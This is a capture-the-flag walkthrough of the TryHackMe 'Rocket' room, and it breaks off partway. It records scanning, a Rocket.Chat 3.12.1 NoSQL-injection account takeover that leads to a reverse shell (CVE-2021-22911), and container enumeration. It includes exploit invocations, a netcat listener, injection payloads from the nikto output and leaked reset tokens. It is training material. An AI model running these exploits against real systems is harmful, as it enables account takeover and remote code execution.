<h1 align="center">Rocket</h1>
<p align="center">2025, October 10<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>522</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Get ready for blast off</em>!<br>
<img width="80px" src="https://github.com/user-attachments/assets/4bd98eee-f7e5-4344-bbd9-9dc09770d763"><br>
Access it <a href="https://tryhackme.com/room/rocket">here</a>.<br>
<img width="1200px" src=""></p>

<h2>Task 1 . Deploy the machine</h2>
<p>Perform a penetration test against the target host to retrieve the user.txt and root.txt files.<br>
Please allow approximately 2-5 minutes for the services to start.<br>

<a href="https://twitter.com/thecybergeek19">Follow me on Twitter @TheCyberGeek19</a></p>

<p><em>Aswer the question below</p>

<p>1.1. No answer needed<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . COmpromise the machine</h2>
<p>Compromise the target and obtain the user.txt and root.txt file.</p>

<p><em>Aswer the questions below</p>

<p>2.1. What is contained within the user.txt file?<br>
<code>______________</code></p>

<p>2.2. What is contained within the root.txt file?<br>
<code>______________</code></p>

<br>
<h1 align="center">Summary</h1>
<p>
  
- [Static Host Mapping](#1)<br>
- [Port Scanning](#2)<br>
- [Web Vulberability Scanning](#3)<br>
- [Directory and File Enumeration](#4)</p>



<br>
<h1 align="center">Static Host Mapping<a id='1'></a></h1>

```bash
10.201.32.184 rocket.thm
```

<h1 align="center">Port Scanning<a id='2'></a></h1>
<p align="center"><strong>2</strong> open ports.<br></p>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                           |
|-------------------:|:---------------------|:---------------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3         |
| `80`               |`HTTP`                |Apache httpd 2.4.29 - <code>Bolt</code> |

</p></div><br>

```bash
:~/Rocket# nmap -sC -sV -Pn -p- --min-rate 10000 rocket.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.29
|_http-generator: Bolt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home | Rocket Entertainment
```

<img width="1207" height="357" alt="image" src="https://github.com/user-attachments/assets/d84d3a9b-dcec-4b96-b487-1aaac67440c7" />

<br>
<br>
<br>
<h1 align="center">Web Vulberability Scanning<a id='3'></a></h1>
<p align="center">Retrieved x-powered-by header: <code>Bolt</code>.<br>rocket.thm/api/<code>docs.jsonld</code><br><code>robots.txt</code><br>/forumscalendar.php?calbirthdays=1&action=getday&day=2001...<br>/vbcalendar.php?calbirthdays=1&action=getday&day=...&<br>/vbulletincalendar.php?calbirthdays=1&action=getday&day=...<br>'admin:aaLR8vE.jjhss:root@127.0.0.  password located in ans_data/ans.passwd<br></p>


```bash
:~/Rocket# nikto -h rocket.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        80
+ Start Time:         2025-10-10 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Retrieved x-powered-by header: Bolt
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'link' found, with contents: <http://rocket.thm/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x6a 0x5c39ec1123bc0 
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: GET, POST 
+ OSVDB-3233: /doc/rt/overview-summary.html: Oracle Business Components for Java 3.1 docs is running.
+ OSVDB-3299: /forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
+ OSVDB-3299: /forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
+ OSVDB-3299: /htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
+ OSVDB-3299: /vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
+ OSVDB-3299: /vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
+ OSVDB-724: /ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
+ OSVDB-724: /ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3092: /nl/: This might be interesting... potential country code (Netherlands)
+ OSVDB-3092: /es/: This might be interesting... potential country code (Spain)
...
```

<br>
<h1 align="center">Directory and File Enumeration<a id='4'></a></h1>

```bash
:~/Rocket# gobuster dir -u http://rocket.thm/bolt/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -k -x js,css,php
/about                (Status: 302) [Size: 290] [--> /bolt/login]
/search               (Status: 302) [Size: 389] [--> /bolt/login]
/login                (Status: 200) [Size: 4729]
/content              (Status: 302) [Size: 290] [--> /bolt/login]
...
```

<br>
<h1 align="center">Web Interface Inspection<a id='5'></a></h1>
<br>
<p align="center">rocket.thm</p>
<p>
  
- Marcus Quigley CEO &amp; Founder)
- Kevin Boyle (Human Resources)
- Laurent Povolski (Team Coordinator)
- Lucy Crooks (Sales Representative)
- support@rocket.thm</p>


<img width="1130" height="612" alt="image" src="https://github.com/user-attachments/assets/9b354463-706f-4089-aad1-6899143cf93a" />

<br>
<br>
<br>

<img width="1133" height="616" alt="image" src="https://github.com/user-attachments/assets/32831593-5fbc-40da-9034-aa4e6a012e9e" />

<br>
<br>
<br>

<img width="1128" height="571" alt="image" src="https://github.com/user-attachments/assets/131ab03a-834b-436c-bc6a-7cde63a00d88" />

<br>
<br>
<br>
<p align="center">rocket.thm/bolt/login</p>

<img width="1129" height="661" alt="image" src="https://github.com/user-attachments/assets/6b4b1907-3647-48c1-a022-4e0b12ec5a22" />

<br>
<br>
<br>

<p align="center">Tried lili:password = invalid credentials.<br>Tried kevin:passowrd = invalid credentials.<br>In Burp Suite = 200 OK</p>

<img width="1128" height="265" alt="image" src="https://github.com/user-attachments/assets/c818b4a0-fc90-40f6-8441-b85b1ada1c12" />

<br>
<br>
<br>

```bash
:~/Rocket# ffuf -c -u 'http://rocket.thm' -H 'host: FUZZ.rocket.thm' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fw 20
...
gc._msdcs               [Status: 400, Size: 423, Words: 42, Lines: 13]
chat                    [Status: 200, Size: 224515, Words: 12566, Lines: 490]
```

<img width="1339" height="430" alt="image" src="https://github.com/user-attachments/assets/a16500c2-672c-4c9a-b168-48794332e69d" />

<br>
<br>
<br>

<br>
<h1 align="center">Static Host Mapping<a id='1'></a></h1>

```bash
10.201.32.184 rocket.thm chat.rocket.thm
```

<br>
<br>
<br>
<p align="center">chat.rocket.thm/home<br>Powered by Open Source Chat Platform Rocket.Chat</p>

<img width="1129" height="599" alt="image" src="https://github.com/user-attachments/assets/633eaf66-be27-463d-a171-af8994ac69b1" />

<br>
<br>
<br>
<p align="center">Registered an account.</p>

<img width="1128" height="409" alt="image" src="https://github.com/user-attachments/assets/8e2ba54f-11ff-453c-99ae-0eb4f75e6d4e" />

<br>
<br>
<br>

<img width="1127" height="465" alt="image" src="https://github.com/user-attachments/assets/bbee2841-edd1-43a1-ac74-21fb3a2e3614" />

<br>
<br>
<br>
<p align="center">Clicked general.</p>

<img width="1131" height="464" alt="image" src="https://github.com/user-attachments/assets/8dd565ad-6ee6-47ba-aa2a-b96b5b632aec" />

<br>
<br>
<br>
<p align="center">Identified <code>rc_token</code> and <code>rc_uid</code>.</p

<img width="1132" height="275" alt="image" src="https://github.com/user-attachments/assets/c2cdc61b-93de-494b-8bb6-d43da1f5057a" />

<br>
<br>
<br>
<p align="center">Identified Rocket.chat 3.12.1 - NoSQL Injection to RCE (Unathenticated), <code>50108.py</code>.</p

```bash
:~/Rocket# searchsploit rocket
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Epic Games Rocket League 1.95 - Stack Buffer Overrun                                                                                                   | windows/local/49848.txt
Rocket LMS 1.1 - Persistent Cross Site Scripting (XSS)                                                                                                 | php/webapps/50677.txt
Rocket Servergraph Admin Center - fileRequestor Remote Code Execution (Metasploit)                                                                     | multiple/remote/33807.rb
Rocket Software UniData 7.2.7.3806 - Denial of Service                                                                                                 | windows/dos/15260.txt
Rocket.Chat 2.1.0 - Cross-Site Scripting                                                                                                               | linux/webapps/47537.txt
Rocket.Chat 3.12.1 - NoSQL Injection (Unauthenticated)                                                                                                 | linux/webapps/49960.py
Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)                                                                                      | linux/webapps/50108.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

<img width="1332" height="229" alt="image" src="https://github.com/user-attachments/assets/f34b946e-2ec4-42a0-98b5-4907eab3c6a4" />

<br>
<br>
<br>

```bash
:~/Rocket# searchsploit -m linux/webapps/50108.py
```

```bash
:~/Rocket# pip3 install oathtool
```

```bash
:~/Rocket# python3 50108.py -u 'lili@mail.com' -a 'admin@rocket.thm' -t 'http://chat.rocket.thm'
[+] Resetting lili@mail.com password
[+] Password Reset Email Sent
Got: 9
Got: 9D
Got: 9DI
Got: 9DI7
Got: 9DI7u
Got: 9DI7uv
Got: 9DI7uvy
Got: 9DI7uvyd
Got: 9DI7uvyd0
Got: 9DI7uvyd0EJ
Got: 9DI7uvyd0EJW
Got: 9DI7uvyd0EJWJ
Got: 9DI7uvyd0EJWJ
Got: 9DI7uvyd0EJWJn
Got: 9DI7uvyd0EJWJnz
Got: 9DI7uvyd0EJWJnzg
Got: 9DI7uvyd0EJWJnzgE
Got: 9DI7uvyd0EJWJnzgE-
Got: 9DI7uvyd0EJWJnzgE-6
Got: 9DI7uvyd0EJWJnzgE-6W
Got: 9DI7uvyd0EJWJnzgE-6Ww
Got: 9DI7uvyd0EJWJnzgE-6Ww9
Got: 9DI7uvyd0EJWJnzgE-6Wx9X
Got: 9DI7uvyd0EJWJnzgE-6Wx9X3
...
```

<p align="center"><code>50108.py</code> considers 2FA secret key and in our study case admin is not protected by 2FA.<br>So I execute another script<br>
https://github.com/optionalCTF/Rocket.Chat-Automated-Account-Takeover-RCE-CVE-2021-22911</p



```bash
:~/Rocket# python3 exploit.py -u 'lili@mail.com' -a 'admin@rocket.thm' -t 'http://chat.rocket.thm' -i 10.201.124.55 -p 9001
[+] Resetting admin  password
[+] Password Reset Email Sent
Got: e
Got: ev
Got: evG
Got: evGs
Got: evGsC
Got: evGsCx
Got: evGsCxs
Got: evGsCxsk
Got: evGsCxsk2
Got: evGsCxsk2k
Got: evGsCxsk2kL
Got: evGsCxsk2kLD
Got: evGsCxsk2kLD0
Got: evGsCxsk2kLD04
Got: evGsCxsk2kLD04F
Got: evGsCxsk2kLD04FY
Got: evGsCxsk2kLD04FY-
Got: evGsCxsk2kLD04FY-L
Got: evGsCxsk2kLD04FY-LP
Got: evGsCxsk2kLD04FY-LPp
Got: evGsCxsk2kLD04FY-LPp9
Got: evGsCxsk2kLD04FY-LPp9y
Got: evGsCxsk2kLD04FY-LPp9y_
Got: evGsCxsk2kLD04FY-LPp9y_l
Got: evGsCxsk2kLD04FY-LPp9y_lw
Got: evGsCxsk2kLD04FY-LPp9y_lwg
Got: evGsCxsk2kLD04FY-LPp9y_lwg4
Got: evGsCxsk2kLD04FY-LPp9y_lwg46
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_w
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJ
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv2
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv26
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269d
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269d0
Got: evGsCxsk2kLD04FY-LPp9y_lwg46_wJv269d0W

```


<img width="1337" height="772" alt="image" src="https://github.com/user-attachments/assets/f1f3be3c-5a7c-4f26-bfef-b31cb655aaa8" />

<br>
<br>
<br>

<img width="1213" height="102" alt="image" src="https://github.com/user-attachments/assets/5d7697d9-91cd-4de9-af6f-f23940fe711f" />

<br>
<br>
<br>

<img width="1331" height="259" alt="image" src="https://github.com/user-attachments/assets/3422ccb6-dcc2-43b4-9165-15f76f9f15bd" />

<br>
<br>
<br>


```bash
:~/Rocket# nc -nlvp 9001
```


```bash
rocketchat@c2c82695ecf1:/app/bundle/programs/server$ ls -lah
ls -lah
total 304K
drwxr-xr-x   7 rocketchat rocketchat 4.0K Mar 31  2021 .
drwxr-xr-x   5 rocketchat rocketchat 4.0K Mar  8  2021 ..
drwxr-xr-x   2 rocketchat rocketchat 4.0K Mar  8  2021 app
drwxr-xr-x   4 rocketchat rocketchat 4.0K Mar  8  2021 assets
-r--r--r--   1 rocketchat rocketchat  228 Mar  8  2021 boot-utils.js
-r--r--r--   1 rocketchat rocketchat  514 Mar  8  2021 boot-utils.js.map
-r--r--r--   1 rocketchat rocketchat  17K Mar  8  2021 boot.js
-r--r--r--   1 rocketchat rocketchat  31K Mar  8  2021 boot.js.map
-r--r--r--   1 rocketchat rocketchat  145 Mar  8  2021 config.json
-r--r--r--   1 rocketchat rocketchat  383 Mar  8  2021 debug.js
-r--r--r--   1 rocketchat rocketchat  608 Mar  8  2021 debug.js.map
-r--r--r--   1 rocketchat rocketchat 4.2K Mar  8  2021 mini-files.js
-r--r--r--   1 rocketchat rocketchat 8.1K Mar  8  2021 mini-files.js.map
drwxr-xr-x 131 rocketchat rocketchat 4.0K Mar 31  2021 node_modules
drwxr-xr-x   3 rocketchat rocketchat 4.0K Mar  8  2021 npm
-r--r--r--   1 rocketchat rocketchat  699 Mar  8  2021 npm-rebuild-args.js
-r--r--r--   1 rocketchat rocketchat 1.4K Mar  8  2021 npm-rebuild-args.js.map
-r--r--r--   1 rocketchat rocketchat 1.6K Mar  8  2021 npm-rebuild.js
-r--r--r--   1 rocketchat rocketchat 3.6K Mar  8  2021 npm-rebuild.js.map
-r--r--r--   1 rocketchat rocketchat  234 Mar  8  2021 npm-rebuilds.json
-r--r--r--   1 rocketchat rocketchat 5.6K Mar  8  2021 npm-require.js
-r--r--r--   1 rocketchat rocketchat  13K Mar  8  2021 npm-require.js.map
-r--r--r--   1 rocketchat rocketchat  40K Mar 31  2021 npm-shrinkwrap.json
-r--r--r--   1 rocketchat rocketchat  661 Mar  8  2021 package.json
drwxr-xr-x   2 rocketchat rocketchat  12K Mar  8  2021 packages
-r--r--r--   1 rocketchat rocketchat  13K Mar  8  2021 profile.js
-r--r--r--   1 rocketchat rocketchat  23K Mar  8  2021 profile.js.map
-r--r--r--   1 rocketchat rocketchat  30K Mar  8  2021 program.json
-r--r--r--   1 rocketchat rocketchat 1.4K Mar  8  2021 runtime.js
-r--r--r--   1 rocketchat rocketchat 3.0K Mar  8  2021 runtime.js.map
-r--r--r--   1 rocketchat rocketchat  284 Mar  8  2021 server-json.js
-r--r--r--   1 rocketchat rocketchat  806 Mar  8  2021 server-json.js.map
```

```bash
rocketchat@c2c82695ecf1:/app/bundle/programs/server$ find / -perm -4000 -type f -ls 2>/dev/null
```

<img width="1335" height="223" alt="image" src="https://github.com/user-attachments/assets/c13d61a9-e513-46d4-b330-193e31be1619" />


```bash
rocketchat@c2c82695ecf1:/$ getent hosts
getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.17.0.2      db f012d09a863c
172.17.0.3      c2c82695ecf1
```

```bash
rocketchat@c2c82695ecf1:/$ env
env
Direct_Reply_Port=
HOSTNAME=c2c82695ecf1
TEST_METADATA={}
APP_ID=edb3sd4kq9l7.x9kzfv9hhwi
Direct_Reply_Frequency=5
DB_PORT_27017_TCP_PORT=27017
DB_ENV_MONGO_REPO=repo.mongodb.org
SMTP_Protocol=smtp
PWD=/
PORT=3000
DB_PORT_27017_TCP=tcp://172.17.0.2:27017
VIPSHOME=/target
NODE_ENV=production
Accounts_AvatarStorePath=/app/uploads
DB_ENV_MONGO_VERSION=4.0.25
DB_PORT=tcp://172.17.0.2:27017
DEPLOY_METHOD=docker-official
Direct_Reply_Username=
RC_VERSION=3.12.1
HOME=/tmp
...
DB_PORT_27017_TCP_ADDR=172.17.0.2
Direct_Reply_Protocol=IMAP
...
DB_ENV_MONGO_MAJOR=4.0
DB_ENV_MONGO_PACKAGE=mongodb-org
Direct_Reply_Password=
Direct_Reply_Debug=false
DB_ENV_JSYAML_VERSION=3.13.1
...
DB_ENV_GOSU_VERSION=1.12
SMTP_Host=
...
ROOT_URL=http://localhost
MOBILE_ROOT_URL=http://localhost
MONGO_WEB_INTERFACE=172.17.0.4:8081
DB_NAME=/rocketchat/db
MONGO_OPLOG_URL=mongodb://db:27017/local
...
MOBILE_DDP_URL=http://localhost
MONGO_URL=mongodb://db:27017/meteor
NODE_VERSION=12.18.4
HTTP_FORWARDED_COUNT=1
DB_PORT_27017_TCP_PROTO=tcp
_=/usr/bin/env
OLDPWD=/app
```




```bash
rocketchat@c2c82695ecf1:/proc$ ls
ls
1
22
23
24
68
acpi
buddyinfo
...
```








